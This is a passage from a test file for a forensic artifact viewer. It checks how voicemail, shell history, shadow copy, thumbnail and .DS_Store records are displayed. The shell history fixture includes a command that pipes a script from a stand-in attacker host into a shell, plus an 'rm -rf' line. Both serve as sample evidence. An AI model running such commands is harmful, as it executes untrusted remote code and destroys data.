  it('Voicemail: a deletion state the store did not record reads "not recorded"', async () => {
    mockByType({
      Voicemail: [
        rec('v3', {
          type: 'Voicemail',
          sender: '+15550001111',
          date: 1_673_200_000,
          deleted: null,
        }),
      ],
    })
    renderViewer('Voicemail')

    expect(await screen.findByText('+15550001111')).toBeInTheDocument()
    expect(screen.getByText('not recorded')).toBeInTheDocument()
    expect(screen.queryByText('deleted')).not.toBeInTheDocument()
  })

  it('Shell history: dimension by shell and shows the command', async () => {
    mockByType({
      ShellHistoryEntry: [
        rec('h1', {
          type: 'ShellHistoryEntry',
          shell: 'zsh',
          command: 'sudo rm -rf /tmp/x',
          line_number: 12,
          date: 1_673_000_000,
        }),
        rec('h2', {
          type: 'ShellHistoryEntry',
          shell: 'bash',
          command: 'curl http://evil.example/x.sh | sh',
          line_number: 3,
        }),
      ],
    })
    renderViewer('ShellHistoryEntry')

    expect(await screen.findByText('sudo rm -rf /tmp/x')).toBeInTheDocument()
    expect(screen.getByText(/curl http:\/\/evil\.example/)).toBeInTheDocument()
  })

  it('VSS: tiles snapshots by reconstructability and shows creation time', async () => {
    mockByType({
      VssSnapshot: [
        rec('vss1', {
          type: 'VssSnapshot',
          name: 'Shadow Copy {abc}',
          snapshot_id: 'abc',
          creation_time: 1_600_000_000,
          volume_size: 128_000_000_000,
          modified_blocks: 4210,
          content_reconstruction: 'reconstructed',
          store_version: 'Windows 10',
        }),
        rec('vss2', {
          type: 'VssSnapshot',
          name: 'Shadow Copy {def}',
          snapshot_id: 'def',
          creation_time: 1_600_100_000,
          volume_size: 128_000_000_000,
          content_reconstruction: 'unavailable_requires_store_chain',
          store_version: 'Windows 10',
        }),
      ],
    })
    renderViewer('VssSnapshot')

    expect(
      await screen.findByRole('button', { name: /Content reconstructable/ }),
    ).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /Needs store chain/ })).toBeInTheDocument()
    expect(screen.getByText('Shadow Copy {abc}')).toBeInTheDocument()
    expect(screen.getByText('reconstructable')).toBeInTheDocument()
  })

  it('Freedesktop thumbnails: shows the original file and its source mtime', async () => {
    mockByType({
      FreedesktopThumbnail: [
        rec('t1', {
          type: 'FreedesktopThumbnail',
          original_path: '/home/user/photos/holiday.jpg',
          source_mtime: 1_673_000_000,
          mime_type: 'image/jpeg',
          software: 'GNOME::ThumbnailFactory',
        }),
      ],
    })
    renderViewer('FreedesktopThumbnail')

    expect(await screen.findByText('/home/user/photos/holiday.jpg')).toBeInTheDocument()
    expect(screen.getByText('image/jpeg')).toBeInTheDocument()
  })

  it('.DS_Store: lists folder entries with their record ids', async () => {
    mockByType({
      DSStoreEntry: [
        rec('d1', {
          type: 'DSStoreEntry',
          filename: 'screenshots',
          structures: ['Iloc', 'bwsp'],
        }),
      ],
    })
    renderViewer('DSStoreEntry')

    expect(await screen.findByText('screenshots')).toBeInTheDocument()
    expect(screen.getByText('Iloc, bwsp')).toBeInTheDocument()
  })
})
